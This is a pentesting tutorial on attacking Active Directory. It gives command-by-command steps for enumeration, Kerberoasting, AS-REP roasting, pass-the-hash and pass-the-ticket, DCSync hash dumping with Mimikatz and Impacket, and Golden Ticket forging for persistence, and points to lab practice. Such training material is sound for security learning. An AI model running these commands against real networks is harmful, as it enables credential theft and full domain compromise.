# 🏢 Active Directory Attacks

> Most corporate networks run Active Directory. Understanding it is essential for real-world pentesting.

---

## What is Active Directory?

Active Directory (AD) is Microsoft's directory service used by most enterprises to manage users, computers, and permissions across a network.

### Key Concepts

| Term | Definition |
|------|-----------|
| **Domain** | Logical group of AD objects (users, computers) |
| **Domain Controller (DC)** | Server that runs AD and handles authentication |
| **Forest** | One or more domains sharing a schema |
| **OU (Organisational Unit)** | Container for organising objects |
| **GPO** | Group Policy Object — applies settings to objects |
| **LDAP** | Protocol used to query AD |
| **Kerberos** | Authentication protocol used in AD |
| **NTLM** | Older authentication protocol (fallback) |
| **SPN** | Service Principal Name — links services to accounts |

---

## Enumeration — Know the Environment

### From Windows (Authenticated)

```powershell
# Get domain info
Get-ADDomain
net user /domain

# List all users
Get-ADUser -Filter * | Select Name, SamAccountName
net user /domain

# List all groups
Get-ADGroup -Filter * | Select Name
net group /domain

# Find domain admins
Get-ADGroupMember "Domain Admins"
net group "Domain Admins" /domain

# Find computers
Get-ADComputer -Filter * | Select Name, IPv4Address

# Current user's privileges
whoami /all
```

### From Linux (with Credentials)

```bash
# Enumerate with ldapsearch
ldapsearch -x -H ldap://192.168.1.100 -D 'domain\user' -w 'password' -b "DC=domain,DC=local"

# CrackMapExec — versatile enumeration
crackmapexec smb 192.168.1.100 -u user -p password --users
crackmapexec smb 192.168.1.100 -u user -p password --groups
crackmapexec smb 192.168.1.100 -u user -p password --shares

# Impacket GetADUsers
impacket-GetADUsers -all domain.local/user:password -dc-ip 192.168.1.100
```

### BloodHound — Attack Path Visualisation

BloodHound maps relationships in AD and finds paths to Domain Admin.

```bash
# Collect data with SharpHound (Windows)
SharpHound.exe -c All

# Or from Linux with BloodHound.py
pip install bloodhound
bloodhound-python -u user -p password -d domain.local -ns 192.168.1.100 -c all

# Start BloodHound
neo4j start
bloodhound
# Import the collected .zip file
```

**Key BloodHound queries:**
- "Find Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- "Shortest Paths from Owned Principals"

---

## Kerberoasting

Request service tickets for accounts with SPNs, then crack them offline.

```bash
# From Linux (Impacket)
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.100 -request

# From Windows (PowerView)
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# Crack the ticket
hashcat -m 13100 kerberoast.hash rockyou.txt
john kerberoast.hash --wordlist=rockyou.txt
```

---

## AS-REP Roasting

Attack accounts that don't require Kerberos pre-authentication.

```bash
# Find vulnerable accounts (no pre-auth required)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -dc-ip 192.168.1.100

# Or if you have credentials
impacket-GetNPUsers domain.local/user:password -request -format hashcat -dc-ip 192.168.1.100

# Crack the hash
hashcat -m 18200 asrep.hash rockyou.txt
```

---

## Pass-the-Hash (PTH)

Use captured NTLM hashes without cracking them.

```bash
# PSExec with hash
impacket-psexec -hashes LM:NT administrator@192.168.1.100

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H 'NTLM_HASH'

# Evil-WinRM (WinRM must be enabled)
evil-winrm -i 192.168.1.100 -u administrator -H 'NTLM_HASH'
```

---

## Pass-the-Ticket (PTT)

Steal and reuse Kerberos tickets.

```bash
# From Windows — dump tickets
mimikatz.exe
sekurlsa::tickets /export

# Import a ticket
kerberos::ptt ticket.kirbi

# From Linux — request ticket with hash
impacket-getTGT domain.local/user -hashes LM:NT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@target
```

---

## DCSync Attack

Simulate a Domain Controller and request password hashes for any user, including Domain Admin.

```bash
# Requires: Domain Admin, or account with DCSync rights
impacket-secretsdump domain.local/admin:password@dc-ip -just-dc

# With Mimikatz (Windows)
lsadump::dcsync /user:krbtgt
lsadump::dcsync /all /csv
```

---

## Golden Ticket Attack

Forge Kerberos tickets using the `krbtgt` hash — gives permanent domain persistence.

```bash
# 1. Get the krbtgt hash (via DCSync)
impacket-secretsdump domain.local/admin:password@dc-ip -just-dc-user krbtgt

# 2. Get domain SID
impacket-getPac domain.local/user:password -dc-ip 192.168.1.100

# 3. Create golden ticket (Mimikatz)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# 4. Use the ticket
dir \\dc\c$
```

---

## LDAP Enumeration (No Credentials)

Some domains allow anonymous or unauthenticated LDAP queries.

```bash
# Check for anonymous LDAP
ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=local"

# Enumerate with enum4linux
enum4linux -a 192.168.1.100
enum4linux-ng -A 192.168.1.100

# SMB null session
crackmapexec smb 192.168.1.100 -u '' -p ''
```

---

## Common AD Attack Chain

```
1. Foothold
   └── Phishing / web vuln / password spray → low-priv shell

2. Enumeration
   └── BloodHound → find attack paths

3. Lateral Movement
   └── Pass-the-Hash / Kerberoasting → more accounts

4. Privilege Escalation
   └── Find DA account / ACL abuse / DCSync

5. Domain Compromise
   └── Dump all hashes → Golden Ticket → persistence
```

---

## Key Tools Summary

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualisation |
| SharpHound | BloodHound data collector |
| Impacket | AD attack suite (Python) |
| CrackMapExec | Swiss army knife for AD |
| Evil-WinRM | WinRM shell |
| Mimikatz | Credential dumping (Windows) |
| Rubeus | Kerberos attacks (Windows) |
| PowerView | AD enumeration (PowerShell) |

---

> 🎯 Practice on: [HackTheBox](https://hackthebox.com) AD machines, or set up your own lab with Windows Server + a few VMs.
